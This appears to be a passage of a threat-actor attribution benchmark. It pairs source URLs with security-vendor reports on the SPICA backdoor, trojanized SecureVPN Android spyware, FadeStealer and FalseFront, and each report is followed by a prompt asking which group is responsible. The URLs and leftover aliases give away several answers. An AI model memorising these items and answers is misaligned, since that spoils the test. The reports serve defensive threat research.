establishes persistence and starts the main C2 loop, waiting for commands to execute.    The backdoor establishes persistence via an obfuscated PowerShell command which creates a scheduled task named CalendarChecker:    screenshot of lines of code  Obfuscated PowerShell command    TAG has observed SPICA being used as early as September 2023, but believe that [PLACEHOLDER]’s use of the backdoor goes back to at least November 2022. While TAG has observed four different variants of the initial “encrypted” PDF lure, we have only been able to successfully retrieve a single instance of SPICA. This sample, named “Proton-decrypter.exe”, used the C2 address 45.133.216[.]15:3000, and was likely active around August and September 2023.    We believe there may be multiple versions of the SPICA backdoor, each with a different embedded decoy document to match the lure document sent to targets.    Protecting the community  As part of our efforts to combat serious threat actors, TAG uses the results of our research to improve the safety and security of Google’s products. Upon discovery, all identified websites, domains and files are added to Safe Browsing to protect users from further exploitation. TAG also sends all targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity and encourages potential targets to enable Enhanced Safe Browsing for Chrome and ensure that all devices are updated.    We are committed to sharing our findings with the security community to raise awareness, and with companies and individuals that might have been targeted by these activities. We hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Over the years, TAG has analyzed a range of persistent threats including [PLACEHOLDER], a Russian threat group focused on credential phishing activities against high profile individuals in NGOs, former intelligence and military officers, and NATO governments. For years, TAG has been countering and reporting on this group’s efforts to conduct espionage aligned with the interests of the Russian government. To add to the community’s understanding of [PLACEHOLDER] activity, we’re shining light on their extended capabilities which now includes the use of malware.    [PLACEHOLDER] continues its focus on credential phishing against Ukraine, NATO countries, academic institutions and NGOs. In order to gain the trust of targets, [PLACEHOLDER] often utilizes impersonation accounts, pretending to be an expert in a particular field or somehow affiliated with the target. The impersonation account is then used to establish a rapport with the target, increasing the likelihood of the phishing campaign's success, and eventually sends a phishing link or document containing a link. Recently published information on [PLACEHOLDER] highlights the group's evolving tactics, techniques and procedures (TTPs), to improve its detection evasion capabilities.    Recently, TAG has observed [PLACEHOLDER] continue this evolution by going beyond phishing for credentials, to delivering malware via campaigns using PDFs as lure documents. TAG has disrupted the following campaign by adding all known domains and hashes to Safe Browsing blocklists.    “Encrypted” lure-based malware delivery  As far back as November 2022, TAG has observed [PLACEHOLDER] sending targets benign PDF documents from impersonation accounts. [PLACEHOLDER] presents these documents as a new op-ed or other type of article that the impersonation account is looking to publish, asking for feedback from the target. When the user opens the benign PDF, the text appears encrypted.      If the target responds that they cannot read the encrypted document, the [PLACEHOLDER] impersonation account responds with a link, usually hosted on a cloud storage site, to a “decryption” utility for the target to use. This decryption utility, while also displaying a decoy document, is in fact a backdoor, tracked as SPICA, giving [PLACEHOLDER] access to the victim’s machine.    In 2015 and 2016, TAG observed [PLACEHOLDER] using the Scout implant that was leaked during the Hacking Team incident of July 2015. SPICA represents the first custom malware that we attribute being developed and used by [PLACEHOLDER].    SPICA backdoor  SPICA is written in Rust, and uses JSON over websockets for command and control (C2). It supports a number of commands including:    Executing arbitrary shell commands  Stealing cookies from Chrome, Firefox, Opera and Edge  Uploading and downloading files  Perusing the filesystem by listing the contents of it  Enumerating documents and exfiltrating them in an archive  There is also a command called “telegram,” but the functionality of this command is unclear  Once executed, SPICA decodes an embedded PDF, writes it to disk, and opens it as a decoy for the user. In the background, it establishes persistence and starts the main C2 loop, waiting for commands to execute.    The backdoor establishes persistence via an obfuscated PowerShell command which creates a scheduled task named CalendarChecker:    screenshot of lines of code  Obfuscated PowerShell command    TAG has observed SPICA being used as early as September 2023, but believe that [PLACEHOLDER]’s use of the backdoor goes back to at least November 2022. While TAG has observed four different variants of the initial “encrypted” PDF lure, we have only been able to successfully retrieve a single instance of SPICA. This sample, named “Proton-decrypter.exe”, used the C2 address 45.133.216[.]15:3000, and was likely active around August and September 2023.    We believe there may be multiple versions of the SPICA backdoor, each with a different embedded decoy document to match the lure document sent to targets.    Protecting the community  As part of our efforts to combat serious threat actors, TAG uses the results of our research to improve the safety and security of Google’s products. Upon discovery, all identified websites, domains and files are added to Safe Browsing to protect users from further exploitation. TAG also sends all targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity and encourages potential targets to enable Enhanced Safe Browsing for Chrome and ensure that all devices are updated.    We are committed to sharing our findings with the security community to raise awareness, and with companies and individuals that might have been targeted by these activities. We hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry.
https://www.welivesecurity.com/2022/11/23/bahamut-cybermercenary-group-targets-android-users-fake-vpn-apps/	ESET researchers have identified an active campaign targeting Android users, conducted by the [PLACEHOLDER] APT group. This campaign has been active since January 2022 and malicious apps are distributed through a fake SecureVPN website that provides only Android apps to download. Note that although the malware employed throughout this campaign uses the name SecureVPN, it has no association whatsoever with the legitimate, multiplatform SecureVPN software and service.      Key points of this blogpost:    The app used has at different times been a trojanized version of one of two legitimate VPN apps, SoftVPN or OpenVPN, which have been repackaged with [PLACEHOLDER] spyware code that the [PLACEHOLDER] group has used in the past.  We were able to identify at least eight versions of these maliciously patched apps with code changes and updates being made available through the distribution website, which might mean that the campaign is well maintained.  The main purpose of the app modifications is to extract sensitive user data and actively spy on victims’ messaging apps.  We believe that targets are carefully chosen, since once the [PLACEHOLDER] spyware is launched, it requests an activation key before the VPN and spyware functionality can be enabled. Both the activation key and website link are likely sent to targeted users.  We do not know the initial distribution vector (email, social media, messaging apps, SMS, etc.).      ESET researchers discovered at least eight versions of the [PLACEHOLDER] spyware. The malware is distributed through a fake SecureVPN website as trojanized versions of two legitimate apps – SoftVPN and OpenVPN. These malicious apps were never available for download from Google Play.  The malware is able to exfiltrate sensitive data such as contacts, SMS messages, call logs, device location, and recorded phone calls. It can also actively spy on chat messages exchanged through very popular messaging apps including Signal, Viber, WhatsApp, Telegram, and Facebook Messenger; the data exfiltration is done via the keylogging functionality of the malware, which misuses accessibility services. The campaign appears to be highly targeted, as we see no instances in our telemetry data.    [PLACEHOLDER] overview  The [PLACEHOLDER] APT group typically targets entities and individuals in the Middle East and South Asia with spearphishing messages and fake applications as the initial attack vector. [PLACEHOLDER] specializes in cyberespionage, and we believe that its goal is to steal sensitive information from its victims. [PLACEHOLDER] is also referred to as a mercenary group offering hack-for-hire services to a wide range of clients. The name was given to this threat actor, which appears to be a master in phishing, by the Bellingcat investigative journalism group. Bellingcat named the group after the enormous fish floating in the vast Arabian Sea mentioned in the Book of Imaginary Beings written by Jorge Luis Borges. [PLACEHOLDER] is frequently described in Arabic mythology as an unimaginably enormous fish.    The group has been the subject of several publications in recent years, including:    2017 – Bellingcat [1][2]  2018 – Talos [1][2]  2018 – Trend Micro  2020 – BlackBerry [pdf]  2020 – SonicWall  2021 – 打假的Hunter  2021 – Cyble  2022 – CoreSec360  2022 – Cyble  Distribution  The initial fake SecureVPN app we analyzed was uploaded to VirusTotal on 2022-03-17, from an IP address that geolocates to Singapore, along with a link to a fake website that triggered one of our YARA rules.    At the same time, we were notified on Twitter via DM from @malwrhunterteam about the same sample.    The malicious Android application used in this campaign was delivered via the website thesecurevpn[.]com (see Figure 1), which uses the name – but none of the content or styling – of the legitimate SecureVPN service (at the domain securevpn.com).      Figure 1. Fake SecureVPN website provides a trojanized app to download    This fake SecureVPN website was created based on a free web template (see Figure 2), which was most likely used by the threat actor as an inspiration, since it required only small changes and looks trustworthy.      Figure 2. Free website template used to create the distribution website for the fake VPN app    thesecurevpn[.]com was registered on 2022-01-27; however, the time of initial distribution of the fake SecureVPN app is unknown. The malicious app is provided directly from the website and has never been available at the Google Play store.    Attribution  Malicious code in the fake SecureVPN sample was seen in the SecureChat campaign documented by Cyble and CoreSec360. We have seen this code being used only in campaigns conducted by [PLACEHOLDER]; similarities to those campaigns include storing sensitive information in a local database before uploading it to the C&C server. The amount of data stored in these databases probably depends on the campaign. In Figure 3 you can see malicious package classes from this variant compared to a previous sample of [PLACEHOLDER] code.      Figure 3. Class name comparison between the earlier malicious SecureChat package (left) and fake SecureVPN package (right)    Comparing Figure 4 and Figure 5, you can see the similarities in SQL queries in the earlier SecureChat malware, attributed to [PLACEHOLDER], and the fake SecureVPN malware.      Figure 4. The SQL queries used in malicious code from the earlier SecureChat campaign      Figure 5. The SQL queries used in malicious code in the fake SecureVPN campaign    As such, we believe that the fake SecureVPN application is linked to the [PLACEHOLDER] group.    Analysis  Since the distribution website has been online, there have been at least eight versions of the [PLACEHOLDER] spyware available for download. These versions were created by the threat actor, where the fake application name was followed by the version number. We were able to pull the following versions from the server, where we believe the version with the lowest version suffix was provided to potential victims in the past, while more recently higher version numbers (secureVPN_104.apk, SecureVPN_105.apk, SecureVPN_106.apk, SecureVPN_107.apk, SecureVPN_108.apk, SecureVPN_109.apk, SecureVPN_1010.apk, secureVPN_1010b.apk) have been used.    We divide these versions into two branches, since [PLACEHOLDER]’s malicious code was placed into two different legitimate VPN apps.    In the first branch, from version secureVPN_104 until secureVPN_108, malicious code was inserted into the legitimate SoftVPN application that can be found on Google Play and uses the unique package name com.secure.vpn. This package name is also visible in the PARENT_APPLICATION_ID value in the version information found in the decompiled source code of the first fake SecureVPN app branch, as seen in Figure 6.      Figure 6. Fake SecureVPN v1.0.4 with malicious code included into SoftVPN as parent application    In the second branch, from version secureVPN_109 until secureVPN_1010b, malicious code was inserted into the legitimate open-source application OpenVPN, which is available on Google Play, and that uses the unique package name com.openvpn.secure. As with the trojanized SoftVPN branch, the original app’s package name is also visible in the fake SecureVPN app’s version information, found in the decompiled source code, as seen in Figure 7.      Figure 7. Fake SecureVPN v1.0.9 (SecureVPN_109) with malicious code included into OpenVPN as its parent application even though the hardcoded VERSION_NAME (1.0.0) wasn’t changed between versions    Besides the split in these two branches, where the same malicious code is implanted into two different VPN apps, other fake SecureVPN version updates contained only minor code changes or fixes, with nothing significant considering its overall functionality.    The reason why the threat actor switched from patching SoftVPN to OpenVPN as its parent app is not clear; however, we suspect that the reason might be that the legitimate SoftVPN app stopped working or being maintained and was no longer able to create VPN connections – as confirmed by our testing of the latest SoftVPN app from Google Play. This could be a reason for [PLACEHOLDER] to switch to using OpenVPN, since potential victims might uninstall a non-working VPN app from their devices. Changing one parent app to another likely required more time, resources, and effort to successfully implement by the threat actor.    Malicious code packaged with the OpenVPN app was implemented a layer above the VPN code. That malicious code implements spyware functionality that requests an activation key and then checks the supplied key against the attacker’s C&C server. If the key is successfully entered, the server will return a token that is necessary for successful communication between the [PLACEHOLDER] spyware and its C&C server. If the key is not correct, neither [PLACEHOLDER] spyware nor VPN functionality will be enabled. Unfortunately, without the activation key, dynamic malware analysis sandboxes might not flag it as a malicious app.    In Figure 8 you can see an initial activation key request and in Figure 9 the network traffic behind such a request and the response from the C&C server.      Figure 8. Fake SecureVPN requests activation key before enabling VPN and spyware functions      Figure 9. Fake SecureVPN activation request and its C&C server’s response    The campaigns using the fake SecureVPN app try to keep a low profile, since the website URL is most likely delivered to potential victims with an activation key, which is not provided on the website. Unfortunately, we were not able to obtain a working key.    The activation key layer does not belong to the original OpenVPN functionality, and we do not recognize it as code from any other legitimate app. We believe it was developed by [PLACEHOLDER], since it also communicates with their C&C server.    Implementing a layer to protect a payload from being triggered right after launch on a non-targeted user device or when being analyzed is not a unique feature. We already saw similar protection being used in another campaign by the [PLACEHOLDER] group implemented in the SecureChat app analyzed by CoreSec360. That required extra effort by the victim, who had to create an account and log into it, which then enabled the [PLACEHOLDER] spyware functionality. We have also observed comparable protection being used by APT-C-23, where the potential victim needs a valid Coupon Code to download the malicious app.    Functionality  If the [PLACEHOLDER] spyware is enabled, then it can be remotely controlled by [PLACEHOLDER] operators and can exfiltrate various sensitive device data such as:    contacts,  SMS messages,  call logs,  a list of installed apps,  device location,  device accounts,  device info (type of internet connection, IMEI, IP, SIM serial number),  recorded phone calls, and  a list of files on external storage.  By misusing accessibility services, as seen in Figure 10, the malware can steal notes from the SafeNotes application and actively spy on chat messages and information about calls from popular messaging apps such as:    imo-International Calls & Chat,  Facebook Messenger,  Viber,  Signal Private Messenger,  WhatsApp,  Telegram,  WeChat, and  Conion apps.    Figure 10. Fake SecureVPN request to manually enable Accessibility services    All exfiltrated data is stored in a local database and then sent to the C&C server. The [PLACEHOLDER] spyware functionality includes the ability to update the app by receiving a link to a new version from the C&C server.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: ESET researchers have identified an active campaign targeting Android users, conducted by the [PLACEHOLDER] APT group. This campaign has been active since January 2022 and malicious apps are distributed through a fake SecureVPN website that provides only Android apps to download. Note that although the malware employed throughout this campaign uses the name SecureVPN, it has no association whatsoever with the legitimate, multiplatform SecureVPN software and service.      Key points of this blogpost:    The app used has at different times been a trojanized version of one of two legitimate VPN apps, SoftVPN or OpenVPN, which have been repackaged with [PLACEHOLDER] spyware code that the [PLACEHOLDER] group has used in the past.  We were able to identify at least eight versions of these maliciously patched apps with code changes and updates being made available through the distribution website, which might mean that the campaign is well maintained.  The main purpose of the app modifications is to extract sensitive user data and actively spy on victims’ messaging apps.  We believe that targets are carefully chosen, since once the [PLACEHOLDER] spyware is launched, it requests an activation key before the VPN and spyware functionality can be enabled. Both the activation key and website link are likely sent to targeted users.  We do not know the initial distribution vector (email, social media, messaging apps, SMS, etc.).      ESET researchers discovered at least eight versions of the [PLACEHOLDER] spyware. The malware is distributed through a fake SecureVPN website as trojanized versions of two legitimate apps – SoftVPN and OpenVPN. These malicious apps were never available for download from Google Play.  The malware is able to exfiltrate sensitive data such as contacts, SMS messages, call logs, device location, and recorded phone calls. It can also actively spy on chat messages exchanged through very popular messaging apps including Signal, Viber, WhatsApp, Telegram, and Facebook Messenger; the data exfiltration is done via the keylogging functionality of the malware, which misuses accessibility services. The campaign appears to be highly targeted, as we see no instances in our telemetry data.    [PLACEHOLDER] overview  The [PLACEHOLDER] APT group typically targets entities and individuals in the Middle East and South Asia with spearphishing messages and fake applications as the initial attack vector. [PLACEHOLDER] specializes in cyberespionage, and we believe that its goal is to steal sensitive information from its victims. [PLACEHOLDER] is also referred to as a mercenary group offering hack-for-hire services to a wide range of clients. The name was given to this threat actor, which appears to be a master in phishing, by the Bellingcat investigative journalism group. Bellingcat named the group after the enormous fish floating in the vast Arabian Sea mentioned in the Book of Imaginary Beings written by Jorge Luis Borges. [PLACEHOLDER] is frequently described in Arabic mythology as an unimaginably enormous fish.    The group has been the subject of several publications in recent years, including:    2017 – Bellingcat [1][2]  2018 – Talos [1][2]  2018 – Trend Micro  2020 – BlackBerry [pdf]  2020 – SonicWall  2021 – 打假的Hunter  2021 – Cyble  2022 – CoreSec360  2022 – Cyble  Distribution  The initial fake SecureVPN app we analyzed was uploaded to VirusTotal on 2022-03-17, from an IP address that geolocates to Singapore, along with a link to a fake website that triggered one of our YARA rules.    At the same time, we were notified on Twitter via DM from @malwrhunterteam about the same sample.    The malicious Android application used in this campaign was delivered via the website thesecurevpn[.]com (see Figure 1), which uses the name – but none of the content or styling – of the legitimate SecureVPN service (at the domain securevpn.com).      Figure 1. Fake SecureVPN website provides a trojanized app to download    This fake SecureVPN website was created based on a free web template (see Figure 2), which was most likely used by the threat actor as an inspiration, since it required only small changes and looks trustworthy.      Figure 2. Free website template used to create the distribution website for the fake VPN app    thesecurevpn[.]com was registered on 2022-01-27; however, the time of initial distribution of the fake SecureVPN app is unknown. The malicious app is provided directly from the website and has never been available at the Google Play store.    Attribution  Malicious code in the fake SecureVPN sample was seen in the SecureChat campaign documented by Cyble and CoreSec360. We have seen this code being used only in campaigns conducted by [PLACEHOLDER]; similarities to those campaigns include storing sensitive information in a local database before uploading it to the C&C server. The amount of data stored in these databases probably depends on the campaign. In Figure 3 you can see malicious package classes from this variant compared to a previous sample of [PLACEHOLDER] code.      Figure 3. Class name comparison between the earlier malicious SecureChat package (left) and fake SecureVPN package (right)    Comparing Figure 4 and Figure 5, you can see the similarities in SQL queries in the earlier SecureChat malware, attributed to [PLACEHOLDER], and the fake SecureVPN malware.      Figure 4. The SQL queries used in malicious code from the earlier SecureChat campaign      Figure 5. The SQL queries used in malicious code in the fake SecureVPN campaign    As such, we believe that the fake SecureVPN application is linked to the [PLACEHOLDER] group.    Analysis  Since the distribution website has been online, there have been at least eight versions of the [PLACEHOLDER] spyware available for download. These versions were created by the threat actor, where the fake application name was followed by the version number. We were able to pull the following versions from the server, where we believe the version with the lowest version suffix was provided to potential victims in the past, while more recently higher version numbers (secureVPN_104.apk, SecureVPN_105.apk, SecureVPN_106.apk, SecureVPN_107.apk, SecureVPN_108.apk, SecureVPN_109.apk, SecureVPN_1010.apk, secureVPN_1010b.apk) have been used.    We divide these versions into two branches, since [PLACEHOLDER]’s malicious code was placed into two different legitimate VPN apps.    In the first branch, from version secureVPN_104 until secureVPN_108, malicious code was inserted into the legitimate SoftVPN application that can be found on Google Play and uses the unique package name com.secure.vpn. This package name is also visible in the PARENT_APPLICATION_ID value in the version information found in the decompiled source code of the first fake SecureVPN app branch, as seen in Figure 6.      Figure 6. Fake SecureVPN v1.0.4 with malicious code included into SoftVPN as parent application    In the second branch, from version secureVPN_109 until secureVPN_1010b, malicious code was inserted into the legitimate open-source application OpenVPN, which is available on Google Play, and that uses the unique package name com.openvpn.secure. As with the trojanized SoftVPN branch, the original app’s package name is also visible in the fake SecureVPN app’s version information, found in the decompiled source code, as seen in Figure 7.      Figure 7. Fake SecureVPN v1.0.9 (SecureVPN_109) with malicious code included into OpenVPN as its parent application even though the hardcoded VERSION_NAME (1.0.0) wasn’t changed between versions    Besides the split in these two branches, where the same malicious code is implanted into two different VPN apps, other fake SecureVPN version updates contained only minor code changes or fixes, with nothing significant considering its overall functionality.    The reason why the threat actor switched from patching SoftVPN to OpenVPN as its parent app is not clear; however, we suspect that the reason might be that the legitimate SoftVPN app stopped working or being maintained and was no longer able to create VPN connections – as confirmed by our testing of the latest SoftVPN app from Google Play. This could be a reason for [PLACEHOLDER] to switch to using OpenVPN, since potential victims might uninstall a non-working VPN app from their devices. Changing one parent app to another likely required more time, resources, and effort to successfully implement by the threat actor.    Malicious code packaged with the OpenVPN app was implemented a layer above the VPN code. That malicious code implements spyware functionality that requests an activation key and then checks the supplied key against the attacker’s C&C server. If the key is successfully entered, the server will return a token that is necessary for successful communication between the [PLACEHOLDER] spyware and its C&C server. If the key is not correct, neither [PLACEHOLDER] spyware nor VPN functionality will be enabled. Unfortunately, without the activation key, dynamic malware analysis sandboxes might not flag it as a malicious app.    In Figure 8 you can see an initial activation key request and in Figure 9 the network traffic behind such a request and the response from the C&C server.      Figure 8. Fake SecureVPN requests activation key before enabling VPN and spyware functions      Figure 9. Fake SecureVPN activation request and its C&C server’s response    The campaigns using the fake SecureVPN app try to keep a low profile, since the website URL is most likely delivered to potential victims with an activation key, which is not provided on the website. Unfortunately, we were not able to obtain a working key.    The activation key layer does not belong to the original OpenVPN functionality, and we do not recognize it as code from any other legitimate app. We believe it was developed by [PLACEHOLDER], since it also communicates with their C&C server.    Implementing a layer to protect a payload from being triggered right after launch on a non-targeted user device or when being analyzed is not a unique feature. We already saw similar protection being used in another campaign by the [PLACEHOLDER] group implemented in the SecureChat app analyzed by CoreSec360. That required extra effort by the victim, who had to create an account and log into it, which then enabled the [PLACEHOLDER] spyware functionality. We have also observed comparable protection being used by APT-C-23, where the potential victim needs a valid Coupon Code to download the malicious app.    Functionality  If the [PLACEHOLDER] spyware is enabled, then it can be remotely controlled by [PLACEHOLDER] operators and can exfiltrate various sensitive device data such as:    contacts,  SMS messages,  call logs,  a list of installed apps,  device location,  device accounts,  device info (type of internet connection, IMEI, IP, SIM serial number),  recorded phone calls, and  a list of files on external storage.  By misusing accessibility services, as seen in Figure 10, the malware can steal notes from the SafeNotes application and actively spy on chat messages and information about calls from popular messaging apps such as:    imo-International Calls & Chat,  Facebook Messenger,  Viber,  Signal Private Messenger,  WhatsApp,  Telegram,  WeChat, and  Conion apps.    Figure 10. Fake SecureVPN request to manually enable Accessibility services    All exfiltrated data is stored in a local database and then sent to the C&C server. The [PLACEHOLDER] spyware functionality includes the ability to update the app by receiving a link to a new version from the C&C server.
https://www.bleepingcomputer.com/news/security/apt37-hackers-deploy-new-fadestealer-eavesdropping-malware/	The North Korean [PLACEHOLDER] hacking group uses a new 'FadeStealer' information-stealing malware containing a 'wiretapping' feature, allowing the threat actor to snoop and record from victims' microphones.    [PLACEHOLDER], also known as StarCruft, Reaper, or RedEyes, is believed to be a state-sponsored hacking group with a long history of conducting cyber espionage attacks aligned with North Korean interests. These attacks target North Korean defectors, educational institutions, and EU-based organizations.    In the past, the hackers were known to utilize custom malware called 'Dolphin' and 'M2RAT' to execute commands and steal data, credentials, and screenshots from Windows devices and even connected mobile phones.    It starts with a CHM file  In a new report from the AhnLab Security Emergency Response Center (ASEC), researchers provide information on new custom malware dubbed 'AblyGo backdoor' and 'FadeStealer' that the threat actors use in cyber espionage attacks.    The StarCruft attack flow  The StarCruft attack flow  Source: ASEC  The malware is believed to be delivered using phishing emails with attached archives containing password-protected Word and Hangul Word Processor documents (.docx and .hwp files) and a 'password.chm' Windows CHM file.    ASEC believes that the phishing emails instruct the recipient to open the CHM file to obtain the password for the documents, which begins the infection process on the Windows device.    Once the CHM file is opened, it will display the alleged password to open the document but also quietly downloads and executes a remote PowerShell script that contains backdoor functionality and is registered to autostart with Windows.      AD    This PowerShell backdoor communicates with the attackers' command and control servers and executes any commands sent by the attackers.    The backdoor is used to deploy an additional GoLang backdoor used in the later stages of the attack to conduct privilege escalation, data theft, and the delivery of further malware.    This new backdoor is named 'AblyGo backdoor,' as it uses the Ably Platform, an API service that allows developers to deploy real-time features and information delivery in their applications.    The threat actors use ABLY as a command and control platform to send base64-encoded commands to the backdoor to execute and then to receive any output, where the threat actors later retrieve it.    As this is a legitimate platform, it is likely used by the threat actors to evade network monitoring and security software.    ASEC gained access to the Ably API key used by the backdoor and could monitor some of the commands issued by the attackers. These commands illustrated how the hackers used the backdoor to list the files in a directory, rename a fake .jpg file to an .exe file, and then execute it.    However, it is technically possible for the threat actor to send any command they wish to execute.    FadeStealer wiretaps your device  Ultimately, the backdoors deploy a final payload in the form of 'FadeStealer,' an information-stealing malware capable of stealing a wide variety of information from Windows devices.        When installed, FadeStealer is injected using DLL sideloading into the legitimate Internet Explorer 'ieinstall.exe' process and begins stealing data from the device and storing them in RAR archives every 30 minutes.    The data includes screenshots, logged keystrokes, files collected from connected smartphones, and removable devices. The malware also includes the ability to record audio from a connected microphone, enabling the threat actors to listen in on conversations.    This data is collected in the following %Temp% folders:    Folder Path Exfiltrated Data  %temp%\VSTelems_Fade\NgenPdbc Screenshots  %temp%\VSTelems_Fade\NgenPdbk Keylogging  %temp%\VSTelems_Fade\NgenPdbm Microphone wiretapping  %temp%\VSTelems_FadeIn Data collection of smartphone device  %temp%\VSTelems_FadeOut Removable media device  The threat actors can then analyze this collected data to steal sensitive information for use by the North Korean government or conduct further attacks.    [PLACEHOLDER] is not the only North Korean threat actor utilizing CHM files to deploy malware.    ASEC also reported today that the Kimsuky state-sponsored hacking group is utilizing CHM files in phishing attacks to deploy malicious scripts that steal user information and install additional malware.    "If you examine the overall attack flow in this case, the threat actor carried out their attack cleverly and precisely by employing spear phishing emails to gain access to target systems and using an Ably channel as a command-and-control server," concluded the researchers.    "These sorts of attacks are difficult for individuals to notice."	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: The North Korean [PLACEHOLDER] hacking group uses a new 'FadeStealer' information-stealing malware containing a 'wiretapping' feature, allowing the threat actor to snoop and record from victims' microphones.    [PLACEHOLDER], also known as StarCruft, Reaper, or RedEyes, is believed to be a state-sponsored hacking group with a long history of conducting cyber espionage attacks aligned with North Korean interests. These attacks target North Korean defectors, educational institutions, and EU-based organizations.    In the past, the hackers were known to utilize custom malware called 'Dolphin' and 'M2RAT' to execute commands and steal data, credentials, and screenshots from Windows devices and even connected mobile phones.    It starts with a CHM file  In a new report from the AhnLab Security Emergency Response Center (ASEC), researchers provide information on new custom malware dubbed 'AblyGo backdoor' and 'FadeStealer' that the threat actors use in cyber espionage attacks.    The StarCruft attack flow  The StarCruft attack flow  Source: ASEC  The malware is believed to be delivered using phishing emails with attached archives containing password-protected Word and Hangul Word Processor documents (.docx and .hwp files) and a 'password.chm' Windows CHM file.    ASEC believes that the phishing emails instruct the recipient to open the CHM file to obtain the password for the documents, which begins the infection process on the Windows device.    Once the CHM file is opened, it will display the alleged password to open the document but also quietly downloads and executes a remote PowerShell script that contains backdoor functionality and is registered to autostart with Windows.      AD    This PowerShell backdoor communicates with the attackers' command and control servers and executes any commands sent by the attackers.    The backdoor is used to deploy an additional GoLang backdoor used in the later stages of the attack to conduct privilege escalation, data theft, and the delivery of further malware.    This new backdoor is named 'AblyGo backdoor,' as it uses the Ably Platform, an API service that allows developers to deploy real-time features and information delivery in their applications.    The threat actors use ABLY as a command and control platform to send base64-encoded commands to the backdoor to execute and then to receive any output, where the threat actors later retrieve it.    As this is a legitimate platform, it is likely used by the threat actors to evade network monitoring and security software.    ASEC gained access to the Ably API key used by the backdoor and could monitor some of the commands issued by the attackers. These commands illustrated how the hackers used the backdoor to list the files in a directory, rename a fake .jpg file to an .exe file, and then execute it.    However, it is technically possible for the threat actor to send any command they wish to execute.    FadeStealer wiretaps your device  Ultimately, the backdoors deploy a final payload in the form of 'FadeStealer,' an information-stealing malware capable of stealing a wide variety of information from Windows devices.        When installed, FadeStealer is injected using DLL sideloading into the legitimate Internet Explorer 'ieinstall.exe' process and begins stealing data from the device and storing them in RAR archives every 30 minutes.    The data includes screenshots, logged keystrokes, files collected from connected smartphones, and removable devices. The malware also includes the ability to record audio from a connected microphone, enabling the threat actors to listen in on conversations.    This data is collected in the following %Temp% folders:    Folder Path Exfiltrated Data  %temp%\VSTelems_Fade\NgenPdbc Screenshots  %temp%\VSTelems_Fade\NgenPdbk Keylogging  %temp%\VSTelems_Fade\NgenPdbm Microphone wiretapping  %temp%\VSTelems_FadeIn Data collection of smartphone device  %temp%\VSTelems_FadeOut Removable media device  The threat actors can then analyze this collected data to steal sensitive information for use by the North Korean government or conduct further attacks.    [PLACEHOLDER] is not the only North Korean threat actor utilizing CHM files to deploy malware.    ASEC also reported today that the Kimsuky state-sponsored hacking group is utilizing CHM files in phishing attacks to deploy malicious scripts that steal user information and install additional malware.    "If you examine the overall attack flow in this case, the threat actor carried out their attack cleverly and precisely by employing spear phishing emails to gain access to target systems and using an Ably channel as a command-and-control server," concluded the researchers.    "These sorts of attacks are difficult for individuals to notice."
https://www.uscloud.com/blog/hackers-target-government-defense-contractors-with-new-backdoor-malware/	Microsoft has recently revealed that [PLACEHOLDER], an Iranian cyber-espionage group also known as Peach Sandstorm, HOLMIUM, or Refined Kitten, is targeting defense contractors around the globe with a newly discovered backdoor malware called FalseFront. This targeted attack underscores the persistent threat these state-backed hackers pose to the security of sensitive technologies and information.    New Malware Attack on Government Defense Contractors  What is the New "FalseFront" Backdoor Malware Attack?  FalseFront is a custom-built backdoor malware that grants [PLACEHOLDER] operatives remote access to compromised systems, allowing them to execute programs and steal data within infected networks. Once stolen, it enables file transfer to its command-and-control (C2) servers.    FalseFront marks a worrying evolution in [PLACEHOLDER]’s capabilities. Its first observation in the wild dates back to early November 2023, indicating a relatively recent development. Microsoft also highlights that its design aligns with past [PLACEHOLDER] tactics, suggesting a continual refinement of their cyber-espionage toolset.    What is FalseFront backdoor malware  Defense Industrial Base (DIB) Targeted by Iranian Sponsored [PLACEHOLDER]  The [PLACEHOLDER] attacks specifically target the Defense Industrial Base (DIB), a network of over 100,000 defense companies and subcontractors responsible for researching and developing military weapons systems, subsystems, and components. This isn’t the first time [PLACEHOLDER] has set its sights on the DIB.    In September 2023, Microsoft reported a separate campaign involving extensive password spray attacks aimed at thousands of organizations, including several within the defense sector. Across 2023, [PLACEHOLDER] showed interest in US and other country’s organizations in satellite, defense, and pharmaceuticals. The September attack was a culmination of probes across the year, resulting in data theft from a limited number of victims in these sectors.    This persistence underlines the group’s unwavering focus on acquiring military secrets and potentially disrupting critical infrastructure. [PLACEHOLDER] has attacked sectors across the United States, Saudi Arabia, and South Korea over the past decade, with targets ranging from government, defense, and research, to finance and engineering.    Just two years ago, an Iran-linked hacking group known as DEV-0343 attacked US and Israeli defense technology companies. A stricter measure of cybersecurity control from businesses and those they rely on, chiefly Microsoft in this case, is necessary to ensure protection from foreign attacks and the loss of critical data.    Defense Industrial Base (DIB) targeted by hackers  Top 6 Cybersecurity Threats in 2024  Unfortunately, defense contractors don’t exist in a vacuum. Cyber-espionage campaigns targeting this sector are merely one piece of a larger puzzle. In recent years, defense agencies and contractors worldwide have faced relentless attacks from:    Russian state hackers: Espionage campaigns aimed at military intelligence and technological secrets.  North Korean hacking groups: Attempts to steal confidential information and potentially disrupt critical infrastructure.  Chinese cyber-espionage operations: Long-term efforts to acquire classified information and technological know-how.  This global landscape of cyber threats emphasizes the need for robust cybersecurity measures across the entire Defense Industrial Base.    In fact, this isn’t the first government-based security issue of 2023, with the CISA Citrix Sharefile Bug having occurred in September. That issue resulted in an uptick in suspicious activity, with many attempts to capitalize on the vulnerabilities caused by the bug. Many shady individuals are waiting to jump in and take as much as they can, or 